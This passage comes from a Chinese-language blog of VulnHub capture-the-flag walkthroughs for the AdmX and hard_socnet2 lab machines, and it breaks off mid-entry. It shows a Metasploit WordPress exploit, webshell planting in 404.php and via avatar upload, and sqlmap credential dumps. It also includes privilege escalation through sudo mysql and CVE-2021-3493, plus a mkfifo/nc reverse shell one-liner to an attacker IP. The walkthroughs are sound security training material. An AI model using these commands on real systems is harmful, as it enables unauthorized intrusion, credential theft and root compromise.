寻找可利用的wordpress exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo msfdb run</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search wordpress admin</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117144658121.png" alt="image-20211117144658121"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117145600950.png" alt="image-20211117145600950"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use 2</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set PASSWORD adam14</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set RHOSTS 10.0.2.11</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set TARGETURI /wordpress</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set USERNAME admin</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117145845194.png" alt="image-20211117145845194"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117150025521.png" alt="image-20211117150025521"></p><p>缺点：有些命令不能成功显示</p><h4 id="5-3再次尝试在“主题”插入一句话木马"><a href="#5-3再次尝试在“主题”插入一句话木马" class="headerlink" title="5.3再次尝试在“主题”插入一句话木马"></a>5.3再次尝试在“主题”插入一句话木马</h4><p>回顾之前在Web页面插入一句话木马修改404.php模板失败，那在现已经获得命令行shell的前提下，是否可以尝试手动的添加一句话？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd wp-content</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd themes</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117150443652.png" alt="image-20211117150443652"></p><p>再结合页面信息，确定当前主题名为twentytwentyone（404.php在其目录下）</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117150649101.png" alt="image-20211117150649101"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd twentytwentyone</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117150806467.png" alt="image-20211117150806467"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi 404.php</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211117150904611.png" alt="image-20211117150904611"></p><p>试图移动光标发现webshell在交互过程中仍存在不足</p><p>升级webshell（只适用于bash）(此处是第二次复现整理的WP所以未再次退回环境重新截图，请参考代码文字即可)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ctrl+Z</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stty raw -echo</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fg #返回之前的连接</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><p>因为kali是zsh，故要切换为bash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /bin/bash  #确定是否有bash</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo chsh -s /bin/bash #更改root用户</span><br><span class="line">chsh -s /bin/bash #更改kali用户</span><br><span class="line">（根据需要选择）</span><br></pre></td></tr></table></figure><p>重启后进行确认并监听</p><p>准备重新连接shell</p><p>连接成功</p><p>升级webshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ctrl+Z</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stty raw -echo</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fg #返回之前的连接</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export SHELL=/bin/bash</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export TERM=screen</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stty rows 38 columns 116</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reset</span><br></pre></td></tr></table></figure><p>（升级成功 可Tab补全）调小字体后</p><p>在404.php中写入一句话</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi wp-content/themes/twentytwentyone/404.php</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117152444377.png" alt="image-20211117152444377"></p><p>保存后打开蚁剑进行配置以维持权限稳定</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Shell:http://10.0.2.11/wordpress/wp-content/themes/twentytwentyone/404.php</span><br><span class="line"></span><br><span class="line">pwd:aa</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117152943835.png" alt="image-20211117152943835"></p><p>成功连接</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117153006539.png" alt="image-20211117153006539"></p><h2 id="三、提权"><a href="#三、提权" class="headerlink" title="三、提权"></a>三、提权</h2><h3 id="1-查看-x2F-etc-x2F-passwd"><a href="#1-查看-x2F-etc-x2F-passwd" class="headerlink" title="1.查看&#x2F;etc&#x2F;passwd"></a>1.查看&#x2F;etc&#x2F;passwd</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117153735618.png" alt="image-20211117153735618"></p><h3 id="2-查看主目录文件内是否有该用户"><a href="#2-查看主目录文件内是否有该用户" class="headerlink" title="2.查看主目录文件内是否有该用户"></a>2.查看主目录文件内是否有该用户</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /home/wpadmin/ -l</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117153914865.png" alt="image-20211117153914865"></p><p>发现存在local.txt文件，只有wpadmin用户对其有读的权限</p><h3 id="3-查看操作系统内核"><a href="#3-查看操作系统内核" class="headerlink" title="3.查看操作系统内核"></a>3.查看操作系统内核</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure><p>失败</p><h3 id="4-尝试查看当前用户有没有sudo权限"><a href="#4-尝试查看当前用户有没有sudo权限" class="headerlink" title="4.尝试查看当前用户有没有sudo权限"></a>4.尝试查看当前用户有没有sudo权限</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p>失败</p><h3 id="5-查看WordPress的配置文件"><a href="#5-查看WordPress的配置文件" class="headerlink" title="5.查看WordPress的配置文件"></a>5.查看WordPress的配置文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /var/www/html/wordpress/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat wp-config.php</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117154514825.png" alt="image-20211117154514825"></p><h3 id="6-是否有密码复用的可能性"><a href="#6-是否有密码复用的可能性" class="headerlink" title="6.是否有密码复用的可能性?"></a>6.是否有密码复用的可能性?</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ww-data@wp:/var/www/html/wordpress$ su wpadmin</span><br><span class="line">Password: </span><br><span class="line">su: Authentication failure</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117154640760.png" alt="image-20211117154640760"></p><p>失败</p><h3 id="7-尝试登录数据库账号"><a href="#7-尝试登录数据库账号" class="headerlink" title="7.尝试登录数据库账号"></a>7.尝试登录数据库账号</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u admin -p Wp_Admin#123 -D wordpress</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117154804076.png" alt="image-20211117154804076">失败</p><h3 id="8-尝试是否复用了Web页面的密码"><a href="#8-尝试是否复用了Web页面的密码" class="headerlink" title="8.尝试是否复用了Web页面的密码"></a>8.尝试是否复用了Web页面的密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su wpadmin</span><br></pre></td></tr></table></figure><p>尝试输入密码adam14</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117154929085.png" alt="image-20211117154929085"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat local.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117155043263.png" alt="image-20211117155043263"></p><p>flag1:153495edec1b606c24947b1335998bd9</p><h3 id="9-二次提权"><a href="#9-二次提权" class="headerlink" title="9.二次提权"></a>9.二次提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p>提示可以执行的命令：</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117155135536.png" alt="image-20211117155135536"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/mysql -u root -D wordpress -p    #输入密码adam14</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117155339940.png" alt="image-20211117155339940"></p><p>成功登录数据库</p><h3 id="10-利用mysql数据库特性"><a href="#10-利用mysql数据库特性" class="headerlink" title="10.利用mysql数据库特性"></a>10.利用mysql数据库特性</h3><p>当前启动的数据库进程是具有root权限的，结合mysql数据库 system 命令 的功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system id </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117155440756.png" alt="image-20211117155440756"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\! /bin/bash</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117155507429.png" alt="image-20211117155507429"></p><p>成功获取root权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat proof.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117155542610.png" alt="image-20211117155542610"></p><p>flag2:7efd721c8bfff2937c66235f2d0dbac1</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;靶机地址: &lt;a href=&quot;https://download.vulnhub.com/admx/AdmX_new.7z&quot;&gt;https://download.vulnhub.com/admx/AdmX_new.7z&lt;/a&gt;&lt;br&gt;难度等级: 中&lt;br&gt;打靶目标: 取得 2 个 flag + root 权限&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>VulnHub-5-hard_socnet2</title>
    <link href="http://example.com/2022/04/12/week5/"/>
    <id>http://example.com/2022/04/12/week5/</id>
    <published>2022-04-12T07:08:48.838Z</published>
    <updated>2022-04-12T07:11:05.643Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>靶机地址:</strong> <a href="https://download.vulnhub.com/boredhackerblog/hard_socnet2.ova">https://download.vulnhub.com/boredhackerblog/hard_socnet2.ova</a></p><p><strong>难度等级: 高</strong></p><p><strong>打靶目标:</strong> 取得 root 权限</p><p><strong>参考链接:</strong> </p><ol><li><a href="https://docs.python.org/zh-cn/3/library/xmlrpc.html">https://docs.python.org/zh-cn/3/library/xmlrpc.html</a></li></ol></blockquote><span id="more"></span><h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1-探测主机存活"><a href="#1-探测主机存活" class="headerlink" title="1.探测主机存活"></a>1.探测主机存活</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan 10.0.2.0/24</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211117175256383.png" alt="image-20211117175256383"></p><h3 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p- 10.0.2.12</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211117175552751.png" alt="image-20211117175552751"></p><p>结果显示目标开放了22,80,8000端口</p><h3 id="3-端口服务扫描"><a href="#3-端口服务扫描" class="headerlink" title="3.端口服务扫描"></a>3.端口服务扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sV -p22,80,8000 10.0.2.12</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211117175710597.png" alt="image-20211117175710597"></p><p>22端口 SSH</p><p>80端口 Apache2.4.29 Ubuntu(操作系统)</p><p>8000端口 BaseHTTPServer Python2.7.15(目标靶机支持Python环境)</p><h3 id="4-访问8000端口"><a href="#4-访问8000端口" class="headerlink" title="4.访问8000端口"></a>4.访问8000端口</h3><h4 id="4-1页面报错"><a href="#4-1页面报错" class="headerlink" title="4.1页面报错"></a>4.1页面报错</h4><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211117175907396.png" alt="image-20211117175907396"></p><p>页面信息报错：服务器<strong>不支持GET方法</strong></p><h4 id="4-2尝试更改请求方法"><a href="#4-2尝试更改请求方法" class="headerlink" title="4.2尝试更改请求方法"></a>4.2尝试更改请求方法</h4><p>抓包发送到Repeater</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118091243343.png" alt="image-20211118091243343"></p><p>分别更改为其他各种HTTP请求方法，分别提交</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118091738052.png" alt="image-20211118091738052"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118091813470.png" alt="image-20211118091813470"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118091930161.png" alt="image-20211118091930161"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118092037650.png" alt="image-20211118092037650"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118092119731.png" alt="image-20211118092119731"></p><p>在尝试诸多不同的请求方法后，返回的结果也是<strong>报错失败</strong></p><h3 id="5-访问80端口"><a href="#5-访问80端口" class="headerlink" title="5.访问80端口"></a>5.访问80端口</h3><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211117175818445.png" alt="image-20211117175818445"></p><h4 id="5-1测试登录功能"><a href="#5-1测试登录功能" class="headerlink" title="5.1测试登录功能"></a>5.1测试登录功能</h4><p>尝试进行登录</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211117180300696.png" alt="image-20211117180300696"></p><p>发现登陆页面需要邮箱和密码，且<strong>存在邮箱格式的校验</strong></p><h4 id="5-2测试注册功能"><a href="#5-2测试注册功能" class="headerlink" title="5.2测试注册功能"></a>5.2测试注册功能</h4><p>简单的注册一个账号</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118102057359.png" alt="image-20211118102057359"></p><p>注册完毕后自动跳转到 该用户登录后的页面</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118102610231.png" alt="image-20211118102610231"></p><p>对页面中的信息进行查看，发现名为admin的用户留言显示后台运行监视服务器的<strong>python脚本</strong>，名为<strong>monitor.py</strong>，在此也难免想起之前对端口服务扫描的时候，8000端口的名为BaseHTTPServer的服务和python环境，之后存在可利用的可能性</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118102735643.png" alt="image-20211118102735643"></p><p>继续对网站页面内的其他板块功能进行测试，在Profile页面内显示当前用户未提交–这里指的应该是留言&#x2F;发帖</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118103438523.png" alt="image-20211118103438523"></p><p>简单提交一些信息</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118103739734.png" alt="image-20211118103739734"></p><p>发现Profile页面可以正常访问，且发现上传头像区，那是否也可尝试<strong>文件上传</strong>木马呢？</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118103916272.png" alt="image-20211118103916272"></p><h4 id="5-3测试页面"><a href="#5-3测试页面" class="headerlink" title="5.3测试页面"></a>5.3测试页面</h4><h5 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h5><p>新建aa.php文件，写入一句话木马，并上传</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi aa.php</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118104652005.png" alt="image-20211118104652005"></p><p>没有对文件的后缀和内容进行过滤，此时头像虽未显示，但已经被替换为刚才上传的php文件</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118104836716.png" alt="image-20211118104836716"></p><p>复制头像的地址</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118105035254.png" alt="image-20211118105035254"></p><p>使用蚁剑连接</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118105408035.png" alt="image-20211118105408035"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118145211734.png" alt="image-20211118145211734"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118145647280.png" alt="image-20211118145647280"></p><p>成功拿到目标靶机的基本权限</p><h5 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h5><p>再次回到页面，尝试对其他功能进行测试。</p><p>最终发现在搜索栏内提交了单引号后</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118150028569.png" alt="image-20211118150028569"></p><p>页面显示后台数据库的报错信息，目标数据库应是MySQL数据库，使用SQLMAP进行测试</p><p>​使用Burp抓取提交过程中的数据并将其复制至test文件</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118150619413.png" alt="image-20211118150619413"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r test -p query     #-p 指定参数</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118151256012.png" alt="image-20211118151256012"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118151238752.png" alt="image-20211118151238752"></p><p>确定存在SQL注入漏洞，接下来就可以进行信息的获取了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r test -p query --dbs</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118151606121.png" alt="image-20211118151606121"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r test -p query -D socialnetwork --tables</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118151752362.png" alt="image-20211118151752362"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r test -p query -D socialnetwork -T users --columns</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118151941038.png" alt="image-20211118151941038"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r test -p query -D socialnetwork -T users -C user_email,user_password --dump</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118152315735.png" alt="image-20211118152315735"></p><p>获得了admin账号的邮箱地址和密码，使用admin登录</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118152420558.png" alt="image-20211118152420558"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118152513424.png" alt="image-20211118152513424"></p><p>但是在admin账号内也未发现可利用的信息。</p><h3 id="（时间yyds😄）"><a href="#（时间yyds😄）" class="headerlink" title="（时间yyds😄）"></a>（时间yyds😄）</h3><h4 id="CVE-2021-3493本地提权"><a href="#CVE-2021-3493本地提权" class="headerlink" title="CVE-2021-3493本地提权"></a>CVE-2021-3493本地提权</h4><p>再次回到蚁剑shell中</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118153207728.png" alt="image-20211118153207728"></p><p>目标内核4.15.0-38 操作系统Ubuntu版本为18.04.1 现在较新的版本18.04.5</p><p>查询发现了较新的通用公共漏洞–</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118154013454.png" alt="image-20211118154013454"></p><p>思路：上传至目标靶机上，使用gcc编译后，本地执行</p><p>使用蚁剑文件管理上传到目标靶机上</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118155210947.png" alt="image-20211118155210947"></p><p>使用gcc编译后才可执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o exp exploit.c</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x exp</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./exp</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118155624865.png" alt="image-20211118155624865"></p><p>似乎在蚁剑的shell内不能正常运行，尝试使用nc的shell</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118160045951.png" alt="image-20211118160045951"></p><p>不支持-e参数（可使用串联方法），这里为了拓展攻击方法的多样性，使用命令</p><p>kali:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211122111610268.png" alt="image-20211122111610268"></p><p>蚁剑shell:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.0.2.4 4444 &gt;/tmp/f</span><br></pre></td></tr></table></figure><blockquote><p>rm &#x2F;tmp&#x2F;f 删除该文件（以免跟后面定义的 管道符 冲突）</p><p>mkfifo &#x2F;tmp&#x2F;f 这是创建自定义有名管道符。管道符的名称是 &#x2F;tmp&#x2F;f （用于进程间的通讯， 如 ls &gt; &#x2F;tmp&#x2F;f ，cat &#x2F;tmp&#x2F;f ,连通两个进程之间的通讯)</p><p>cat &#x2F;tmp&#x2F;f 取出管道符中的内容</p><p>|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1 将前面取出的内容作为输入，输入给 &#x2F;bin&#x2F;sh，再将bash的标准错误输出 也作为标准输入 （2 &gt;&amp;1）给bash 然后再将bash的输出，传给nc 远程，再将nc 传来的数据，写入 管道符 &#x2F;tmp&#x2F;f 。最后首尾接通了。</p></blockquote><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211122112048252.png" alt="image-20211122112048252"></p><p>执行后成功上线</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211122112120594.png" alt="image-20211122112120594"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211122112256382.png" alt="image-20211122112256382"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211122113004129.png" alt="image-20211122113004129"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./exp</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211122113224509.png" alt="image-20211122113224509"></p><p>成功提权到root权限</p><p>利用内核漏洞提权后，尝试其他方法</p><p>功成身退🤦‍</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exit</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211122114416703.png" alt="image-20211122114416703"></p><p>回到普通权限后 搜集当前权限下有无可用信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211122114629491.png" alt="image-20211122114629491"></p><p>发现用户socnet具有bash 权限，猜测其可能为主要管理账号</p><p>尝试查看&#x2F;home目录下是否存在该用户文件夹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /home</span><br></pre></td></tr></table></figure><figure class="highlight 